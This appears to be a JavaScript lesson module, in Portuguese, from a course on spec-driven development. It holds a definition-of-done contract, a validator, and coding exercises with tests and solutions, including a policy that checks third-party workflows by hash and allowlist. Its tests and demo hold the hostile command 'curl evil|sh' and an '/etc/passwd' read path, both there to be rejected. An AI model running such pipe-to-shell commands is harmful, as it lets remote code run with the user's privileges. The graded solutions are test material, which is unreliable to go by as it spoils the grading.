/* M01 · Bloco 5: mini-projeto, seu kit SDD e a spec do Capstone. Fonte: M01.html#b05. Saídas do rode: execução real do lab (adapters-demo, test_speckit_capstone, test_policy_adapters, authorize_external_workflow). Fontes técnicas verificadas em 14/08/2026. */
(function () {
  var L = function (kind, text) { return { kind: kind, text: text }; };
  function opc(id, texto, correta, porque) { return { id: id, texto: texto, correta: correta, porque: porque }; }

  var etapasKit = function () {
    return [
      { id: 'adapters', nome: 'Dois adapters, um contrato', descricao: 'Mesmo fingerprint SHA-256', tom: 'dns', ms: 2, linhas: [
        L('cmd', 'python -m sdd_lab adapters-demo examples/feature.valid.json'),
        L('out', 'agent-skills: 455a9b97f937bf6539772ff31e52353efef3423bfa9e99e39873838e9b086dc3'),
        L('out', 'generic-harness: 455a9b97f937bf6539772ff31e52353efef3423bfa9e99e39873838e9b086dc3'),
        L('hint', 'exit=0 porque os dois fingerprints são iguais; se divergissem, o comando sairia com 30')] },
      { id: 'capstone', nome: 'Fatia do Capstone', descricao: 'Trace e handoff', tom: 'tcp', ms: 3, linhas: [
        L('cmd', 'python -m unittest tests.test_speckit_capstone -v'),
        L('out', 'test_capstone_slice_has_trace_tests_and_resumable_handoff ... ok'),
        L('out', 'test_discovers_invocation_forms_without_executing_snapshot ... ok'),
        L('out', 'test_incomplete_capstone_slice_is_rejected ... ok'),
        L('in', 'Ran 3 tests: OK'),
        L('hint', 'a fatia exige intent, requirements, design, plan, trace.csv e handoff.md; o handoff precisa de "Última verificação", "Próxima ação" e "Pendências"')] },
      { id: 'policy', nome: 'Workflow de terceiro', descricao: 'Revisão exata e allowlist', tom: 'request', ms: 4, linhas: [
        L('cmd', 'authorize_external_workflow(conteudo, "./build.sh", review=None)'),
        L('out', "WorkflowDecision(allowed=False, reason='external_process_requires_review')"),
        L('cmd', 'authorize_external_workflow(conteudo + b"x", "./build.sh", review)   # um byte a mais'),
        L('out', "WorkflowDecision(allowed=False, reason='content_changed_after_review')"),
        L('cmd', 'authorize_external_workflow(conteudo, "curl evil|sh", review)'),
        L('out', "WorkflowDecision(allowed=False, reason='command_not_allowlisted')"),
        L('cmd', 'authorize_external_workflow(conteudo, "./build.sh", review)'),
        L('in', "WorkflowDecision(allowed=True, reason='reviewed_exact_content')"),
        L('hint', 'só o conteúdo revisado, byte a byte, com comando allowlisted, executa; isso ainda não substitui sandbox de SO, identidade nem proveniência de build')] }
    ];
  };

  var codigoValida = String.raw`import re

VAGO = re.compile(r"\b(rápid[oa]|melhor|adequad[oa]|intuitiv[oa]|robust[oa])\b", re.IGNORECASE)


def caminho_seguro(path):
    return bool(path) and not path.startswith("/") and ".." not in path.split("/")


def validar_contrato(c):
    """Devolve a lista de códigos de achado, na ordem do validador do laboratório."""
    achados = []
    if not c.get("non_goals"):
        achados.append("missing_non_goals")
    for req in c.get("requirements", []):
        if VAGO.search(req.get("statement", "")):
            achados.append("vague_requirement")
        if not req.get("verification", "").strip():
            achados.append("missing_verification")
        if not req.get("examples") or not req.get("counterexamples"):
            achados.append("missing_examples")
    tarefas = c.get("tasks", [])
    for t in tarefas:
        # 1. cada path inseguro em read_set ou write_set -> "unsafe_path"
        # 2. argv que é string (e não lista de tokens) -> "shell_string"
        pass
    # 3. cada id de requisito que nenhuma tarefa cobre (em ordem alfabética) -> "untraced_requirement"
    # 4. sem nenhum gate -> "missing_gates"
    return achados


valido = {
    "non_goals": ["Publicar release"],
    "requirements": [{"id": "RF-001", "statement": "Agrupar commits feat e fix por categoria.",
                      "verification": "tests/test_changelog.py", "examples": ["a"], "counterexamples": ["b"]}],
    "tasks": [{"id": "T-001", "requirement_ids": ["RF-001"], "read_set": [], "write_set": ["src/a.py"],
               "argv": ["python", "-m", "unittest"]}],
    "gates": [["python", "-c", "print(1)"]],
}
print(validar_contrato(valido))
`;
  var testesValida = String.raw`import copy

VALIDO = {
    "non_goals": ["Publicar release"],
    "requirements": [{"id": "RF-001", "statement": "Agrupar commits feat e fix por categoria.",
                      "verification": "tests/test_changelog.py", "examples": ["a"], "counterexamples": ["b"]}],
    "tasks": [{"id": "T-001", "requirement_ids": ["RF-001"], "read_set": [], "write_set": ["src/a.py"],
               "argv": ["python", "-m", "unittest"]}],
    "gates": [["python", "-c", "print(1)"]],
}

INVALIDO = {
    "non_goals": [],
    "requirements": [{"id": "RF-001", "statement": "O sistema deve ser rápido e robusto.",
                      "verification": "", "examples": [], "counterexamples": []}],
    "tasks": [{"id": "T-001", "requirement_ids": [], "read_set": [], "write_set": ["../fora.txt"],
               "argv": "python -m unittest"}],
    "gates": [],
}


def test_contrato_valido_nao_tem_achados():
    assert validar_contrato(VALIDO) == []


def test_fixture_invalida_do_lab_tem_os_oito_achados_na_ordem():
    assert validar_contrato(INVALIDO) == [
        "missing_non_goals", "vague_requirement", "missing_verification", "missing_examples",
        "unsafe_path", "shell_string", "untraced_requirement", "missing_gates"]


def test_path_absoluto_e_inseguro():
    c = copy.deepcopy(VALIDO)
    c["tasks"][0]["read_set"] = ["/etc/passwd"]
    assert validar_contrato(c) == ["unsafe_path"]


def test_path_com_subida_no_meio_e_inseguro_e_ponto_comum_nao():
    c = copy.deepcopy(VALIDO)
    c["tasks"][0]["write_set"] = ["src/../../x", "src/b.py"]
    assert validar_contrato(c) == ["unsafe_path"]


def test_argv_em_lista_nao_e_shell_string():
    c = copy.deepcopy(VALIDO)
    c["tasks"][0]["argv"] = ["python", "-c", "print('a; b')"]
    assert validar_contrato(c) == []


def test_requisito_sem_tarefa_e_rastreabilidade_quebrada():
    c = copy.deepcopy(VALIDO)
    c["requirements"].append({"id": "RN-001", "statement": "Rodar offline.", "verification": "t",
                              "examples": ["a"], "counterexamples": ["b"]})
    assert validar_contrato(c) == ["untraced_requirement"]


def test_criterio_verificavel_nao_e_vago():
    c = copy.deepcopy(VALIDO)
    c["requirements"][0]["statement"] = "p95 < 100 ms medido com k6 em 100 VUs"
    assert validar_contrato(c) == []
`;
  var solucaoValida = String.raw`def validar_contrato(c):
    achados = []
    if not c.get("non_goals"):
        achados.append("missing_non_goals")
    ids = set()
    for req in c.get("requirements", []):
        ids.add(req.get("id"))
        if VAGO.search(req.get("statement", "")):
            achados.append("vague_requirement")
        if not req.get("verification", "").strip():
            achados.append("missing_verification")
        if not req.get("examples") or not req.get("counterexamples"):
            achados.append("missing_examples")
    cobertos = set()
    for t in c.get("tasks", []):
        for path in list(t.get("read_set", [])) + list(t.get("write_set", [])):
            if not caminho_seguro(path):
                achados.append("unsafe_path")
        if isinstance(t.get("argv"), str):
            achados.append("shell_string")
        cobertos.update(t.get("requirement_ids", []))
    for rid in sorted(ids - cobertos):
        achados.append("untraced_requirement")
    if not c.get("gates"):
        achados.append("missing_gates")
    return achados
`;
  var codigoWf = String.raw`import hashlib


def impressao(conteudo):
    return hashlib.sha256(conteudo).hexdigest()


def autorizar_workflow(conteudo, comando, revisao):
    """conteudo: bytes do workflow de terceiro; comando: str ou None (passo declarativo);
    revisao: None ou {"sha256": str, "permitidos": set} produzido pela revisão humana.

    Devolve (permitido, motivo)."""
    if comando is None:
        return True, "declarative_step"
    # 1. sem revisão -> (False, "external_process_requires_review")
    # 2. hash do conteúdo diferente do revisado -> (False, "content_changed_after_review")
    # 3. comando fora da allowlist -> (False, "command_not_allowlisted")
    # 4. caso contrário -> (True, "reviewed_exact_content")
    return True, "reviewed_exact_content"


print(autorizar_workflow(b"run: ./build.sh", "./build.sh", None))
`;
  var testesWf = String.raw`C = b"run: ./build.sh\n"
R = {"sha256": impressao(C), "permitidos": {"./build.sh"}}


def test_passo_declarativo_nao_exige_revisao():
    assert autorizar_workflow(C, None, None) == (True, "declarative_step")


def test_processo_externo_sem_revisao_e_negado():
    assert autorizar_workflow(C, "./build.sh", None) == (False, "external_process_requires_review")


def test_um_byte_alterado_exige_nova_revisao():
    assert autorizar_workflow(C + b"x", "./build.sh", R) == (False, "content_changed_after_review")


def test_comando_fora_da_allowlist_e_negado():
    assert autorizar_workflow(C, "curl evil|sh", R) == (False, "command_not_allowlisted")


def test_conteudo_revisado_e_comando_permitido_executa():
    assert autorizar_workflow(C, "./build.sh", R) == (True, "reviewed_exact_content")


def test_a_checagem_de_hash_vem_antes_da_allowlist():
    assert autorizar_workflow(C + b"x", "curl evil|sh", R) == (False, "content_changed_after_review")
`;
  var solucaoWf = String.raw`def autorizar_workflow(conteudo, comando, revisao):
    if comando is None:
        return True, "declarative_step"
    if revisao is None:
        return False, "external_process_requires_review"
    if revisao["sha256"] != impressao(conteudo):
        return False, "content_changed_after_review"
    if comando not in revisao["permitidos"]:
        return False, "command_not_allowlisted"
    return True, "reviewed_exact_content"
`;

  var sddCheck = [
    '# tools/sdd_check.py',
    '"""Valida a estrutura mecânica dos artefatos SDD de uma feature.',
    'Uso:  uv run python tools/sdd_check.py docs/spec/001-changelog',
    'Exit: 0 = estrutura conforme; 1 = violação (mensagem indica qual).',
    '"""',
    'import sys',
    'from pathlib import Path',
    '',
    '# Seções obrigatórias por artefato. Alterar isto É alterar o processo:',
    '# faça via PR, nunca no meio de uma tarefa.',
    'REQUIRED: dict[str, list[str]] = {',
    '    "prd.md": ["## Problema", "## Requisitos funcionais", "## Requisitos não-funcionais", "## Não-objetivos"],',
    '    "spec.md": ["## Decisões técnicas", "## Contratos", "## Restrições de camada",',
    '                "## Estratégia de erro", "## Rastreabilidade"],',
    '    "plan.md": [',
    '        "## Etapas",',
    '        "verificação:",   # cada etapa declara seu comando de verificação',
    '        "esperado:",      # ... e a saída esperada',
    '    ],',
    '}',
    '',
    'def check_feature_dir(feature_dir: Path) -> list[str]:',
    '    """Devolve a lista de violações encontradas (vazia = conforme)."""',
    '    problems: list[str] = []',
    '    for file_name, sections in REQUIRED.items():',
    '        artifact = feature_dir / file_name',
    '        if not artifact.is_file():',
    '            problems.append(f"{file_name}: arquivo ausente em {feature_dir}")',
    '            continue',
    '        content = artifact.read_text(encoding="utf-8")',
    '        for section in sections:',
    '            if section not in content:',
    '                problems.append(f"{file_name}: seção obrigatória ausente: \'{section}\'")',
    '    return problems',
    '',
    'def main() -> None:',
    '    if len(sys.argv) != 2:',
    '        print("uso: uv run python tools/sdd_check.py <pasta-da-feature>")',
    '        raise SystemExit(2)',
    '    feature_dir = Path(sys.argv[1])',
    '    if not feature_dir.is_dir():',
    '        print(f"pasta não encontrada: {feature_dir}")',
    '        raise SystemExit(2)',
    '    problems = check_feature_dir(feature_dir)',
    '    if problems:',
    '        print(f"SDD CHECK FALHOU — {len(problems)} violação(ões):")',
    '        for p in problems:',
    '            print(f"  - {p}")',
    '        raise SystemExit(1)',
    '    print(f"SDD CHECK OK: {feature_dir} está estruturalmente conforme.")',
    '',
    'if __name__ == "__main__":',
    '    main()'
  ].join('\n');

  TrilhaAula.registrar({
    id: 'm01-b5',
    titulo: 'Mini-projeto: seu kit SDD e a spec do Capstone',
    minutos: 40,
    resumo: 'O kit reúne contract.md, três skills portáteis, um validador e um runner. Cada peça existe para tirar a definição de "pronto" da opinião do executor.',
    objetivo: 'Ler um contract.md como rubrica mista (máquina e revisão), descrever as três skills e o validador, reconhecer o limite de conferir títulos e tratar workflow de terceiro como supply chain, preparando a fatia do Capstone.',
    revisao: [
      { id: 'm01b5-supply', pergunta: 'Um workflow de terceiro (template ou extensão) será executado no seu fluxo. Qual postura está de acordo com o módulo?',
        opcoes: [
          opc('a', 'Tratar como supply chain: revisar o conteúdo, calcular o SHA-256, liberar só comandos em allowlist e exigir nova revisão a cada byte alterado', true, 'requires é precondição declarativa, não contenção; hash e allowlist ajudam, mas ainda não substituem sandbox de SO, identidade ou proveniência de build.'),
          opc('b', 'Confiar, pois vem de um repositório popular', false, 'popularidade não é revisão, e o processo roda com os privilégios do usuário.'),
          opc('c', 'Confiar se o campo requires declarar as precondições', false, 'requires não contém nada: não há capability sandbox.')] },
      { id: 'm01b5-contract', pergunta: 'Por que o contract.md do kit mistura itens verificáveis por máquina e por revisão rápida?',
        opcoes: [
          opc('a', 'É a rubrica de "pronto" do harness: o que for mecanizável é gate; o resto exige revisão humana orientada por risco, e ambos ficam fora da opinião do executor', true, 'a definição de pronto não pode ficar na opinião de quem executa.'),
          opc('b', 'Por descuido: tudo deveria ser automático', false, 'nem tudo é mecanizável, como "a spec continua verdadeira".'),
          opc('c', 'Porque revisão humana substitui testes', false, 'os dois se complementam.')] },
      { id: 'm01b5-titulos', pergunta: 'O validador mínimo (sdd_check) confere se as seções obrigatórias existem. O que isso NÃO prova?',
        opcoes: [
          opc('a', 'Clareza, rastreabilidade nem segurança de path: título presente não é conteúdo correto', true, 'o núcleo real combina schema, parser, rastreabilidade e casos negativos; JSON Schema valida estrutura, e invariantes de domínio ficam no parser e nos testes.'),
          opc('b', 'Que o arquivo existe', false, 'isso ele confere.'),
          opc('c', 'Que a seção "## Problema" aparece no PRD', false, 'também confere; o limite está no que o título não garante.')] },
      { id: 'm01b5-adapters', pergunta: 'Os adapters Agent Skills e harness genérico exibem o mesmo fingerprint SHA-256. O que isso mostra?',
        opcoes: [
          opc('a', 'Que a regra de domínio vive uma vez no contrato canônico e cada adapter só traduz entrada e apresentação', true, 'mesmo contrato, superfícies diferentes.'),
          opc('b', 'Que os dois adapters executam os mesmos comandos', false, 'o fingerprint é do contrato, não da execução.'),
          opc('c', 'Que o contrato não pode mudar', false, 'mudar o contrato muda o fingerprint; é justamente o que torna a mudança observável.')] },
      { id: 'm01b5-handoff', pergunta: 'O que o handoff da fatia do Capstone precisa conter?',
        opcoes: [
          opc('a', 'Última verificação, próxima ação e pendências, ligados a trace de intent, requisito, decisão, tarefa e teste', true, 'o handoff é o que permite a nova sessão retomar do último estado confirmado.'),
          opc('b', 'Um resumo livre da conversa', false, 'a conversa não é ledger; o handoff é artefato com campos exigidos.'),
          opc('c', 'O diff completo da fatia', false, 'o diff está no repositório; o handoff aponta o estado e o próximo passo.')] }
    ],
    abas: [
      { rotulo: 'Entender', blocos: [
        { tipo: 'texto', html:
          '<h3>O que o mini-projeto integra</h3>' +
          '<p>O mini-projeto reúne <strong>três Agent Skills portáteis</strong>, um contrato canônico versionado, schema 2020-12, parser semântico, dois adapters e uma fatia do Capstone com handoff. Leia os artefatos abaixo como <em>referência de formato e limite</em>: esta aula não é uma lista de tarefas, e nenhum comando aqui cria arquivos. O laboratório guiado do fim do módulo concentra a cópia de trabalho, os comandos e as saídas observáveis.</p>' +
          '<p>O kit separa quatro responsabilidades: <code>contract.md</code> declara o aceite; as skills orientam a escrita de requisitos e planos; o runner executa as verificações; a pasta da feature reúne decisões e evidências. Um template só ajuda se o conteúdo preenchido for revisado e conectado ao comportamento real.</p>' },
        { tipo: 'texto', html:
          '<h3>O contract.md: uma definição mecânica de "pronto"</h3>' },
        { tipo: 'codigo', linguagem: 'markdown', texto: [
          '# Contrato de pronto (Definition of Done)',
          '',
          'Uma etapa de plano SÓ está concluída quando:',
          '1. Ruff format/lint, mypy estrito e unittest saem com código 0.',
          '2. Nenhum arquivo fora da lista declarada da etapa foi modificado',
          '   (`git status --porcelain` mostra apenas os arquivos esperados).',
          '3. O comportamento novo tem pelo menos um teste que FALHA sem a',
          '   mudança e PASSA com ela.',
          '4. A spec correspondente continua verdadeira (mudou comportamento',
          '   => mudou spec no mesmo commit).',
          '5. O commit segue o padrão do repo: inglês, imperativo, escopo curto.',
          '',
          'O que viola qualquer item volta como NÃO CONCLUÍDO, sem negociação.'
        ].join('\n') },
        { tipo: 'texto', html:
          '<p>Os itens 1 e 2 são verificáveis por máquina; os itens 3 a 5, por revisão rápida. A mistura é intencional: é a rubrica do harness (bloco 2, guardrail 5), e a definição de pronto fica fora da opinião do executor.</p>' +
          '<h3>As três skills</h3>' +
          '<p>A estrutura das três skills é a mesma; muda o contrato de saída. Cada uma é uma pasta em <code>skills/</code> com um <code>SKILL.md</code> válido segundo a Agent Skills Specification. Configuração específica de produto, quando necessária, fica no adapter: não duplique validação de requisito dentro dele.</p>' },
        { tipo: 'abas', rotulo: 'As skills', itens: [
          { rotulo: 'prd-writer', blocos: [{ tipo: 'texto', html: '<p>Dado um problema em linguagem natural, produz <code>prd.md</code> com: Problema; Requisitos funcionais (RFn, verificáveis); Requisitos não-funcionais (RNFn, com número: latência, custo, segurança); Não-objetivos (mínimo 3); Critérios de aceitação (cada RF com o comando ou teste que o prova).</p><p>A skill <strong>deve recusar</strong> requisito não verificável, respondendo qual pergunta precisa ser respondida para torná-lo verificável.</p>' }] },
          { rotulo: 'spec-writer', blocos: [{ tipo: 'texto', html: '<p>Dado um <code>prd.md</code>, produz <code>spec.md</code> com: Decisões técnicas (cada uma com a alternativa rejeitada e o porquê); Contratos e schemas; Restrições de camada; Estratégia de erro; Rastreabilidade (tabela RF para seção da spec).</p>' }] },
          { rotulo: 'plan-writer', blocos: [{ tipo: 'texto', html: '<p>Dado <code>prd.md</code> e <code>spec.md</code>, produz <code>plan.md</code> com etapas atômicas: objetivo, arquivos tocados (lista fechada), comando de verificação e saída esperada. Nenhuma etapa passa de 30 minutos de trabalho. A última etapa é sempre "rodar o <code>contract.md</code> inteiro".</p>' }] }
        ] },
        { tipo: 'callout', tom: 'info', titulo: 'Nomes das skills no laboratório', html:
          '<p>O texto do módulo descreve <code>prd-writer</code>, <code>spec-writer</code> e <code>plan-writer</code>. A pasta <code>lab/skills/</code> do repositório traz <code>requirements-writer</code>, <code>plan-writer</code> e <code>spec-reviewer</code>. O que você leva é o invariante: cada skill tem um contrato de saída verificável e recusa o que não é verificável. Confira os nomes na versão do lab que você copiou.</p>' },
        { tipo: 'takeaway', html: 'A definição de pronto mistura <mark>gates de máquina</mark> e <mark>revisão por risco</mark>, e fica fora da opinião do <mark>executor</mark>.' }
      ] },

      { rotulo: 'Ver funcionando', blocos: [
        { tipo: 'texto', html:
          '<h3>Validador mínimo: a ideia, e o seu limite</h3>' +
          '<p>O exemplo abaixo ensina a ideia mínima; <em>não</em> é a implementação aprovada. O núcleo real combina <code>contracts/feature-contract.schema.json</code>, <code>contract.py</code>, rastreabilidade e casos negativos. JSON Schema valida a estrutura expressável; os invariantes de domínio continuam no parser e nos testes.</p>' },
        { tipo: 'codigo', linguagem: 'python', texto: sddCheck },
        { tipo: 'texto', html:
          '<p><strong>Limitação que o exemplo evidencia:</strong> conferir títulos não prova clareza, rastreabilidade nem segurança de path. Rode a suíte real e compare as violações. Não ajuste uma spec só para satisfazer string matching; altere conscientemente contrato e oráculo quando a regra do processo mudar.</p>' },
        { tipo: 'callout', tom: 'neutral', titulo: 'Python que aparece neste exemplo', html:
          '<ul><li><code>from pathlib import Path</code> importa o tipo que representa caminhos; o operador <code>/</code> combina partes respeitando a plataforma e não lê o arquivo.</li>' +
          '<li><code>def nome(param: tipo) -&gt; retorno:</code> declara uma função; as anotações indicam tipos e os dois-pontos com indentação delimitam o corpo. <code>list[str]</code> e <code>dict[str, list[str]]</code> são <code>List&lt;string&gt;</code> e <code>Dictionary&lt;string, List&lt;string&gt;&gt;</code> em C#.</li>' +
          '<li><code>f"texto {variavel}"</code> é uma string interpolada: a expressão entre chaves é avaliada.</li>' +
          '<li><code>raise SystemExit(1)</code> encerra o processo com exit code 1 (<code>Environment.Exit(1)</code>).</li>' +
          '<li><code>if __name__ == "__main__":</code> roda o bloco só quando o arquivo é executado diretamente, não importado (o papel do <code>Main()</code>). O M02 explica o porquê.</li></ul>' },
        { tipo: 'texto', html:
          '<h3>A fatia do Capstone e os dois adapters</h3>' +
          '<p>A fatia contém intent, requisitos, design, plano, trace e handoff. Ela liga intent → RF/RN → decisão → tarefa → teste, e o handoff traz última verificação, próxima ação e pendências. Os adapters Agent Skills e harness genérico exibem o <strong>mesmo fingerprint SHA-256</strong> do contrato canônico. O M04 amplia design e ADRs; segurança, retrieval e operação ficam deliberadamente fora desta fatia. Preveja o que o comando dos adapters imprime.</p>' },
        { tipo: 'rode', id: 'm01b5-rode', titulo: 'Fingerprint, fatia e workflow de terceiro', enunciado: 'Rode o <code>adapters-demo</code> do laboratório e abra as etapas seguintes. Saídas reais do laboratório; o fingerprint é determinístico para o contrato da fixture válida.',
          prefixo: '$', entrada: 'python -m sdd_lab adapters-demo examples/feature.valid.json', unidade: 'testes', terminalTitulo: 'lab M01', etapas: etapasKit(),
          prever: { pergunta: 'Os dois adapters renderizam o mesmo contrato canônico. O que o comando imprime?', opcoes: [
            { id: 'a', texto: 'Dois fingerprints SHA-256 diferentes, um por adapter.', correta: false, porque: 'o fingerprint é do contrato, e o contrato é um só.' },
            { id: 'b', texto: 'Duas linhas com o mesmo fingerprint SHA-256, e exit 0.', correta: true, porque: 'a regra de domínio vive uma vez no núcleo; cada adapter só traduz entrada e apresentação.' },
            { id: 'c', texto: 'Só um fingerprint, porque o segundo adapter reaproveita o primeiro.', correta: false, porque: 'cada adapter imprime a sua linha; o que se compara é o valor.' }
          ] },
          tutorAntes: 'Aperte Enter e depois abra "Workflow de terceiro" para ver as quatro decisões da policy.',
          tutorDepois: 'Dois adapters, um fingerprint: o contrato é a fonte única. Na policy, uma única alteração de byte já derruba a autorização, porque o hash revisado deixa de bater.',
          callout: 'Você viu o contrato único atrás de dois adapters e a policy exigindo revisão exata.' },
        { tipo: 'callout', tom: 'danger', titulo: 'Workflow baixado é supply chain', html:
          '<p>Templates, extensões e workflows podem executar processos com os privilégios do usuário. A documentação de workflows do Spec Kit alerta que <strong>não há capability sandbox</strong> e que <code>requires</code> é precondição declarativa, não contenção. O lab calcula o SHA-256 do conteúdo revisado e libera apenas comandos em allowlist; qualquer byte alterado exige nova revisão. Isso ainda não substitui sandbox de SO, identidade ou proveniência de build.</p>' },
        { tipo: 'takeaway', html: 'Conferir <mark>títulos</mark> não prova conteúdo; workflow baixado é <mark>supply chain</mark>: revisão exata, hash e <mark>allowlist</mark>.' }
      ] },

      { rotulo: 'Praticar', blocos: [
        { tipo: 'texto', html: '<h3>Monte o contract.md</h3><p>Cada lacuna é uma decisão da rubrica de "pronto". Escolha a peça que mantém o critério fora da opinião do executor.</p>' },
        { tipo: 'complete', id: 'm01b5-complete', titulo: 'Complete o contrato de pronto', linguagem: 'markdown',
          enunciado: 'Escolha, em cada lacuna, o trecho que torna o item verificável e sem negociação.',
          partes: [
            '# Contrato de pronto\nUma etapa de plano SÓ está concluída quando:\n1. Ruff format/lint, mypy estrito e unittest saem com código ', { lacuna: 'codigo', opcoes: ['0', '5', 'qualquer código sem traceback'], correta: '0' },
            '.\n2. Nenhum arquivo fora da lista declarada da etapa foi modificado (`', { lacuna: 'git', opcoes: ['git status --porcelain', 'git log --oneline', 'git stash list'], correta: 'git status --porcelain' },
            '` mostra apenas os arquivos esperados).\n3. O comportamento novo tem pelo menos um teste que ', { lacuna: 'teste', opcoes: ['FALHA sem a mudança e PASSA com ela', 'passa com e sem a mudança', 'foi escrito e revisado pelo próprio agente'], correta: 'FALHA sem a mudança e PASSA com ela' },
            '.\n4. A spec correspondente continua verdadeira (mudou comportamento => mudou spec ', { lacuna: 'spec', opcoes: ['no mesmo commit', 'na próxima sprint', 'num PR de documentação separado'], correta: 'no mesmo commit' },
            ').\n5. O commit segue o padrão do repo: ', { lacuna: 'commit', opcoes: ['inglês, imperativo, escopo curto', 'português, no passado', 'mensagem livre'], correta: 'inglês, imperativo, escopo curto' },
            '.\nO que viola qualquer item volta como ', { lacuna: 'volta', opcoes: ['NÃO CONCLUÍDO, sem negociação', 'CONCLUÍDO com ressalva', 'aviso a revisar depois'], correta: 'NÃO CONCLUÍDO, sem negociação' },
            '.\n'
          ],
          explicacao: 'O item 3 é o que impede o teste que prova nada: sem a mudança ele falha, com ela passa. O item 4 evita a spec-fóssil do bloco 1 e o item 2 executa o escopo negativo (write set fechado). Os itens 1 e 2 são de máquina; 3 a 5 pedem revisão rápida, e nenhum fica na opinião do executor.',
          callout: 'Contrato de pronto montado: máquina nos itens 1 e 2, revisão por risco nos demais.' },
        { tipo: 'python', id: 'm01b5-python', titulo: 'Valide o contrato da feature', obrigatorio: false,
          enunciado: 'Complete <code>validar_contrato(c)</code> para devolver os códigos de achado do validador do laboratório, na mesma ordem. Já estão prontos: <code>missing_non_goals</code>, <code>vague_requirement</code>, <code>missing_verification</code> e <code>missing_examples</code>. Falta: <code>unsafe_path</code> (por path em <code>read_set</code> ou <code>write_set</code>), <code>shell_string</code> (<code>argv</code> que é string), <code>untraced_requirement</code> (um por requisito sem tarefa) e <code>missing_gates</code>. A fixture inválida do lab precisa dar os oito achados.',
          codigo: codigoValida, testes: testesValida,
          dica: 'Junte os ids de <code>requirement_ids</code> de todas as tarefas num conjunto e compare com os ids dos requisitos. Use <code>isinstance(t.get("argv"), str)</code> para a string de shell, e o <code>caminho_seguro</code> que já está no código.',
          solucao: solucaoValida,
          tutorDepois: 'O validador recusa e diz onde, sem reescrever a entrada. Veja o controle negativo: "p95 &lt; 100 ms medido com k6" não é vago, e um <code>argv</code> em lista com <code>;</code> dentro de um token não é string de shell. Mesmo assim, ele só cobre invariantes estruturais: não prova que o requisito está certo.',
          callout: 'Validador semântico completo: os oito achados da fixture inválida e nenhum falso positivo.' },
        { tipo: 'python', id: 'm01b5-python-wf', titulo: 'Autorize um workflow de terceiro', obrigatorio: false,
          enunciado: 'Complete <code>autorizar_workflow(conteudo, comando, revisao)</code> como a policy do laboratório: <code>revisao</code> é <code>None</code> ou um dict com <code>sha256</code> (do conteúdo revisado) e <code>permitidos</code> (allowlist de comandos). Devolva <code>(permitido, motivo)</code> com os motivos <code>external_process_requires_review</code>, <code>content_changed_after_review</code>, <code>command_not_allowlisted</code> e <code>reviewed_exact_content</code>.',
          codigo: codigoWf, testes: testesWf,
          dica: 'A ordem importa: primeiro existe revisão? Depois o hash do conteúdo atual bate com o revisado? Só então o comando está na allowlist.',
          solucao: solucaoWf,
          tutorDepois: 'O último teste fixa a ordem: se o conteúdo mudou, nem importa o comando. Hash e allowlist reduzem o risco, mas não substituem sandbox de SO, identidade nem proveniência de build.',
          callout: 'Policy de supply chain implementada: revisão exata do conteúdo e allowlist de comandos.' },
        { tipo: 'cenario', id: 'm01b5-cenario', titulo: 'O template popular', obrigatorio: false,
          enunciado: 'Você quer adotar um template de workflow de terceiro que gera o plano. Ele executa processos com os seus privilégios. Escolha a postura e veja o custo.',
          inicio: 'inicio',
          nos: {
            inicio: { texto: 'O template é de um repositório popular e declara <code>requires</code> com as precondições. O que você faz antes de rodá-lo?', opcoes: [
              { texto: 'Confio: o repositório é popular.', vai: 'f-popular', tom: 'ruim', consequencia: 'popularidade não é revisão, e o processo roda com os seus privilégios.' },
              { texto: 'Confio porque o campo requires declara as precondições.', vai: 'f-requires', tom: 'ruim', consequencia: 'requires é precondição declarativa, não contenção: não há capability sandbox.' },
              { texto: 'Trato como supply chain: reviso o conteúdo, calculo o SHA-256 e libero só comandos em allowlist.', vai: 'revisado', tom: 'ok', consequencia: 'você passa a ter um conteúdo exato, revisado e um conjunto fechado de comandos.' }
            ] },
            revisado: { texto: 'Semanas depois, o mantenedor publica uma atualização do template. Um byte do conteúdo muda. O que acontece no seu fluxo?', opcoes: [
              { texto: 'Roda: a revisão anterior ainda vale.', vai: 'f-velho', tom: 'ruim', consequencia: 'a revisão era do conteúdo antigo; o novo nunca foi lido.' },
              { texto: 'A autorização cai: o hash mudou e o conteúdo precisa de nova revisão.', vai: 'f-bom', tom: 'ok', consequencia: 'qualquer byte alterado exige nova revisão.' }
            ] }
          },
          finais: {
            'f-bom': { bom: true, texto: 'Só o conteúdo revisado executa. Lembre o limite: hash e allowlist ainda não substituem sandbox de SO, identidade nem proveniência de build.' },
            'f-popular': { bom: false, texto: 'Um processo de terceiro rodou com seus privilégios sem ninguém ter lido o conteúdo.' },
            'f-requires': { bom: false, texto: 'A declaração foi tomada por contenção, e nada impedia o processo de agir fora do declarado.' },
            'f-velho': { bom: false, texto: 'O conteúdo novo executou sob uma revisão que não o cobria.' }
          },
          callout: 'Você exigiu revisão exata e nova revisão a cada byte alterado.' },
        { tipo: 'takeaway', html: 'Cada item do contrato tem <mark>oráculo</mark> ou <mark>revisão</mark> declarada; conteúdo de terceiro só executa se for o <mark>exato</mark> conteúdo revisado.' }
      ] },

      { rotulo: 'Conferir', blocos: [
        { tipo: 'escolha', id: 'm01b5-esc-supply', titulo: 'Confira: o workflow de terceiro',
          pergunta: 'Um workflow de terceiro (template ou extensão) será executado no seu fluxo. Qual postura está de acordo com o módulo?',
          opcoes: [
            { id: 'a', texto: 'Confiar, pois vem de um repositório popular.', correta: false, porque: 'popularidade não é revisão.' },
            { id: 'b', texto: 'Confiar se o campo requires declarar as precondições.', correta: false, porque: 'requires é precondição declarativa, não contenção.' },
            { id: 'c', texto: 'Executar primeiro e revisar depois.', correta: false, porque: 'o efeito já ocorreu com os seus privilégios.' },
            { id: 'd', texto: 'Tratar como supply chain: revisar o conteúdo, calcular o SHA-256, liberar só comandos em allowlist e exigir nova revisão a cada byte alterado.', correta: true, porque: 'não há capability sandbox no workflow; hash e allowlist ajudam, mas ainda não substituem sandbox de SO, identidade ou proveniência de build.' }
          ], tutorDepois: 'Declarar não é conter: só a revisão exata do conteúdo libera execução.' },
        { tipo: 'escolha', id: 'm01b5-esc-contract', titulo: 'Confira: a rubrica mista',
          pergunta: 'O contract.md do kit mistura itens verificáveis por máquina e por revisão rápida. Por quê?',
          opcoes: [
            { id: 'a', texto: 'Por descuido: tudo deveria ser automático.', correta: false, porque: 'nem tudo é mecanizável, como "a spec continua verdadeira".' },
            { id: 'b', texto: 'É a rubrica de "pronto" do harness: o que for mecanizável é gate; o resto exige revisão humana orientada por risco, e ambos ficam fora da opinião do executor.', correta: true, porque: 'a definição de pronto não pode ficar na opinião de quem executa.' },
            { id: 'c', texto: 'Porque revisão humana substitui testes.', correta: false, porque: 'são complementares.' },
